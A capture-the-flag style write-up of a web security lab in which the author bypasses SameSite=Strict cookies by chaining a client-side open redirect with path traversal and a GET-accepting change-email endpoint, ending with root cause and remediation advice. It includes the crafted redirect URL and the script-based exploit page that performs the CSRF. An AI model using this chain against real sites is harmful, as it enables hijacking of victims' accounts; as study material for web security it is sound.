# SameSite Strict Bypass via Client-Side Redirect

## Description

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. The provided exploit server was used to host the attack.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and inspect the change email request

I logged in using the given credentials `wiener:peter`, went to `My account`, and tried to change the email address. I captured the request:

```http
POST /my-account/change-email HTTP/2
Host: 0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net
Cookie: session=z1pdwcS5id9VUGtc16GfyVLco8QAWlYQ
Content-Length: 29
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

email=hello%40hl.com&submit=1
```

### Step 2: Confirm the submit parameter is a strict CSRF-adjacent check

I tried removing the `submit` parameter and also tried changing its value, but the server strictly required `submit` to be present with the exact value `1`.

Removing the parameter:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 29

"Missing parameter: 'submit'"
```

Changing the value to `3`:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 31

"Parameter 'submit' is invalid"
```

### Step 3: Confirm the session cookie's SameSite attribute

The `session` cookie was set with `SameSite=Strict`, meaning the browser will not attach it to any request that is initiated from an external domain — even top-level navigations. This rules out any classic cross-site CSRF form submission or navigation-based attack; the request has to originate from the same site itself.

### Step 4: Look for a same-site primitive — the comment confirmation redirect

I browsed around the site and found the blog post/comment feature. Posting a comment redirects to a "Thank you" page, then after a delay redirects back to the post.

I inspected `/resources/js/commentConfirmationRedirect.js` and found:

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

This performs a client-side redirect using `window.location`, built directly from the `postId` query parameter with no validation that it's a genuine numeric post ID. Since the redirect happens via `window.location` from a page already on the target's own origin, this is a **same-site open redirect** — the resulting navigation is still same-site from the cookie's perspective, so `SameSite=Strict` does not block it.

### Step 5: Confirm the open redirect and test path traversal

I tested it with a bogus post ID:

```
https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/post/comment/confirmation?postId=lol
```

This redirected me to `https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/post/lol`.

I then tested path traversal in the `postId` parameter:

```
https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/post/comment/confirmation?postId=../anything/
```

This redirected me to `https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/anything`, confirming the redirect target can be steered to any path on the same origin, not just `/post/<id>`.

### Step 6: Check whether the change-email endpoint accepts GET

For this redirect to be useful against `change-email`, the state-changing request itself would need to be triggerable via a `GET` navigation (since the redirect is just a browser navigation, not a scripted POST). I changed the method from `POST` to `GET` in Burp Suite:

```http
GET /my-account/change-email?email=hello%40hl.com&submit=1 HTTP/2
Host: 0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net
Cookie: session=z1pdwcS5id9VUGtc16GfyVLco8QAWlYQ
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

The server responded with a `302` and the email was updated:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

This confirmed the endpoint accepts `GET` requests carrying the same query parameters as the `POST` body, meaning the entire action can be triggered by a simple navigation.

### Step 7: Chain the open redirect with the GET-based email change

With both pieces confirmed — a same-site open redirect via `postId`, and a `GET`-triggerable `change-email` endpoint — I built a final URL that uses the redirect to send the victim's own browser to the `change-email` endpoint with the malicious parameters, all as a same-site navigation:

```
https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacked%40hacked.com%26submit=1
```

The `postId` value traverses out of `/post/` and lands on `/my-account/change-email`, with the `email` and `submit` parameters URL-encoded (`%26` for `&`) so they survive being appended as part of the path/query construction in the vulnerable JS.

### Step 8: Deliver the exploit

I hosted the following on the exploit server:

```html
<script>
window.location = "https://0a4500ec032a17aa806b0dd0003500c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacked%40hacked.com%26submit=1";
</script>
```

When the victim's browser loads this page, it navigates to the comment confirmation endpoint on the target's own origin. Because the navigation is same-site, the `SameSite=Strict` session cookie **is** sent. The vulnerable client-side redirect script then reconstructs the URL from `postId` and issues `window.location = blogPath + '/' + postId`, which resolves to `/my-account/change-email?email=hacked@hacked.com&submit=1` — a same-site `GET` navigation that the browser happily attaches the session cookie to. The server processes it as a valid change-email request, updating the victim's email to `hacked@hacked.com` and solving the lab.

## Root Cause

The application enforced `SameSite=Strict` on the session cookie, which should have prevented any cross-site-initiated request from carrying it — including navigations. However, this only protects against attacks *originating* from another origin. Two additional flaws combined to defeat it entirely from a same-site starting point:

1. The `change-email` endpoint accepted state-changing requests via `GET`, not just `POST`, so the action could be triggered by a mere navigation instead of a scripted cross-origin request.
2. The comment confirmation page performed a client-side redirect built directly from an unvalidated `postId` query parameter, creating a same-site open redirect that could be steered, via path traversal, to any endpoint on the same origin — including the vulnerable `change-email` GET handler.

Because the malicious navigation is technically initiated from the target's own origin (the exploit page merely sends the browser there, and the redirect chain stays same-site throughout), `SameSite=Strict` never has a reason to withhold the cookie.

## Remediation

- Do not rely on `SameSite` cookie attributes as the sole CSRF defense; use dedicated, unpredictable, per-session anti-CSRF tokens validated on every state-changing request, independent of cookie behavior.
- Ensure state-changing actions (like changing an email address) only ever accept the intended HTTP method (`POST`), never `GET`, so they cannot be triggered by a plain navigation or redirect.
- Validate and strictly allow-list redirect targets on any client- or server-side redirect logic. Never build a redirect URL directly from unvalidated user input (query parameters, especially with directory traversal sequences like `../`).
- Treat client-side redirect scripts with the same scrutiny as server-side redirects — an open redirect that appears "same-site only" can still be chained into serious attacks if other endpoints trust the referring navigation.